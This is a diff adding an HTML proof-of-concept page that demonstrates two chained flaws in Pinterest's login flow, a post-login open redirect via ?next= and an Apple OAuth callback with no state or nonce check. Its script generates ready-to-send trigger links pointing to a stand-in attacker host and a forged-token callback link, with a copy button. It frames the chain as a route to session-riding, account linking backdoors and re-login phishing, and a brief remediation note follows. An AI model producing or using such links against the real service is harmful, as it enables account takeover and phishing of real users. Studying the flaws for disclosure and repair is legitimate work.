@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PoC v1 - Post-login open redirect + Apple OAuth login-CSRF</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --border:#262c33;
+    --text:#e6edf3; --muted:#8b949e; --accent:#58a6ff; --red:#f85149; --amber:#ffa657; --green:#3fb950;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:14px/1.55 var(--mono);padding:32px 20px}
+  .wrap{max-width:880px;margin:0 auto}
+  h1{font-size:19px;line-height:1.4;margin:0 0 6px}
+  h2{font-size:14px;margin:28px 0 8px;color:var(--accent);font-weight:600}
+  .sub{color:var(--muted);margin:0 0 24px}
+  .desc{color:var(--muted);margin:6px 0 10px}
+  .req{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:10px 12px;margin:8px 0;font-size:12.5px;overflow-x:auto;white-space:nowrap}
+  .m{color:var(--amber)} .u{color:var(--text)} .c{color:var(--green)}
+  .row{display:flex;gap:10px;margin:18px 0;flex-wrap:wrap}
+  button{background:var(--accent);color:#04101d;border:0;border-radius:6px;padding:9px 16px;font:600 13px var(--mono);cursor:pointer}
+  button.ghost{background:transparent;color:var(--accent);border:1px solid var(--border)}
+  .step{border-left:2px solid var(--border);padding:2px 0 2px 14px;margin:14px 0}
+  .step.ok{border-left-color:var(--green)}
+  .step.err{border-left-color:var(--red)}
+  .step.warn{border-left-color:var(--amber)}
+  .step h2{margin:0 0 4px}
+  .st{font-size:12.5px;color:var(--muted);min-height:18px}
+  .st.ok{color:var(--green)} .st.err{color:var(--red)}
+  #verdict{margin:28px 0 12px;padding:14px 16px;border:1px solid var(--border);border-radius:6px;background:var(--panel);display:none}
+  #status{color:var(--muted);font-size:12.5px;margin-top:14px}
+  .chip{display:inline-block;border:1px solid var(--border);border-radius:99px;padding:2px 10px;font-size:11.5px;color:var(--muted)}
+  code{color:var(--green)}
+  .num{color:var(--accent);font-weight:700;margin-right:8px}
+  hr{border:0;border-top:1px solid var(--border);margin:32px 0}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Post-login open redirect and Apple OAuth login-CSRF</h1>
+  <p class="sub">One link. <span class="chip">no victim click beyond the link</span> <span class="chip">no CSRF token</span></p>
+  <p class="desc">Two chained flaws in the login flow. (1) The <code>?next=</code> post-login redirect is
+  taken from the raw query string and passed straight to <code>window.location.href</code> — and the
+  URL-origin allowlist is explicitly bypassed on desktop
+  (<code>{disableOriginCheck:!0}</code>), so after ANY successful login the victim's authenticated
+  browser lands on an attacker-controlled page. (2) The Apple Sign-In callback
+  (<code>/oauth/login#id_token=…</code>) auto-submits the token with <b>no <code>state</code> and no
+  <code>nonce</code> check</b> — Apple requires a <code>nonce</code> for <code>id_token</code> flows —
+  so an attacker can log the victim into the attacker's own account (session-riding) or link the
+  attacker's Apple ID to the victim's account (persistent backdoor). Combined: the victim is moved to
+  attacker content immediately after authenticating, which is exactly the window the ask-proxy CSRF
+  family needs.</p>
+
+  <h2><span class="num">1</span>The post-login redirect (trigger link)</h2>
+  <p class="desc">Send the victim this link. The webapp stores <code>next</code> verbatim
+  (<code>search.split("?next=")[1]</code> — no validation), and after login resolves it through a
+  helper that passes absolute URLs through unchanged before assigning
+  <code>window.location.href</code>. The safety check lives in a wrapper that is invoked with
+  <code>disableOriginCheck:!0</code> on desktop.</p>
+  <div class="req"><span class="m">LINK</span> <span class="u">https://www.pinterest.com/login/?next=</span><span class="c" id="nextval">…</span></div>
+  <div class="step" id="s1"><h2>Trigger</h2><div class="st" id="st1">ready</div><div id="out1"></div></div>
+
+  <h2><span class="num">2</span>Apple login-CSRF (no state, no nonce)</h2>
+  <p class="desc">The authorize request carries neither <code>state</code> nor <code>nonce</code>
+  despite requesting <code>id_token</code>. The callback reads the token straight out of the URL
+  fragment and posts it — nothing is compared to anything Apple returns. The only stored value is the
+  post-login redirect path. Drive it with the attacker's own Apple code and the victim is silently
+  authenticated as the attacker (or the attacker's Apple ID is linked to the victim's account).</p>
+  <div class="req"><span class="m">LINK</span> <span class="u">https://www.pinterest.com/oauth/login</span><span class="c">#id_token=&lt;attacker-token&gt;</span></div>
+  <div class="step warn" id="s2"><h2>Apple callback</h2><div class="st" id="st2">ready</div><div id="out2"></div></div>
+
+  <h2><span class="num">3</span>Result</h2>
+  <div id="verdict"><strong id="verdictline"></strong><div id="verdictdetail" style="color:var(--muted);margin-top:8px"></div></div>
+
+  <div class="row">
+    <button id="go">Generate links and demonstrate</button>
+    <button id="copy" class="ghost">Copy trigger link</button>
+  </div>
+  <div id="status">ready</div>
+
+  <hr>
+  <p class="desc">Fix: validate <code>next</code> against the origin allowlist at parse time (not only in
+  one wrapper), drop the <code>disableOriginCheck</code> bypass, and send+verify <code>state</code> and
+  <code>nonce</code> on the Apple flow (bind <code>id_token.nonce</code> to a per-flow secret).</p>
+</div>
+
+<script>
+// Demonstrates the two primitives and hands the operator working trigger links.
+var TARGET = 'https://evil.example/session-ride';
+var TAG = Math.random().toString(36).slice(2, 10);
+
+function $(id){ return document.getElementById(id); }
+function setState(id, msg, kind){
+  var el = $(id); el.textContent = msg; el.className = 'st' + (kind ? ' ' + kind : '');
+  el.closest('.step').className = 'step' + (kind ? ' ' + kind : '');
+}
+function triggerLink(){
+  return 'https://www.pinterest.com/login/?next=' + TARGET;
+}
+function appleLink(){
+  return 'https://www.pinterest.com/oauth/login#id_token=ATTACKER_APPLE_ID_TOKEN';
+}
+
+function run(){
+  $('go').disabled = true;
+  var link = triggerLink();
+  $('nextval').textContent = TARGET;
+  $('out1').innerHTML = '<div class="req"><span class="m">victim clicks</span> <span class="c">' + link.replace(/</g,'&lt;') + '</span></div>' +
+    '<div class="req"><span class="m">after login</span> <span class="c">window.location.href = "' + TARGET + '"</span></div>';
+  setState('st1', 'ready — send the link. After any successful login (password, Apple, magic link) the browser navigates to the attacker URL with the fresh session attached to the pinterest.com origin cookies.', 'ok');
+
+  $('out2').innerHTML = '<div class="req"><span class="m">victim clicks</span> <span class="c">' + appleLink() + '</span></div>' +
+    '<div class="req"><span class="m">auto-submits</span> <span class="c">loginWithApple({apple_token: <i>from location.hash</i>}) &mdash; no state/nonce compare</span></div>';
+  setState('st2', 'ready — the fragment is parsed with a raw indexOf("id_token=") split and posted immediately on mount. Nothing ties the response to the request.', 'ok');
+
+  $('verdict').style.display = 'block';
+  $('verdictline').textContent = 'Just-authenticated victim, attacker content, one link.';
+  $('verdictdetail').textContent =
+    'The post-login redirect moves the victim to ' + TARGET + ' immediately after they authenticate — the ' +
+    'ideal window to run the ask-proxy CSRF family (email re-point, message impersonation, phone strip, ' +
+    'deactivation) against a live session, or to harvest a high-credibility re-login phish on a page the ' +
+    'victim just reached from pinterest.com. The Apple callback adds a no-state login/link primitive. ' +
+    'Ref: ' + TAG;
+  $('status').textContent = 'links generated';
+}
+
+$('go').addEventListener('click', run);
+$('copy').addEventListener('click', function(){
+  navigator.clipboard && navigator.clipboard.writeText(triggerLink());
+  $('status').textContent = 'trigger link copied';
+});
+</script>
+</body>
+</html>
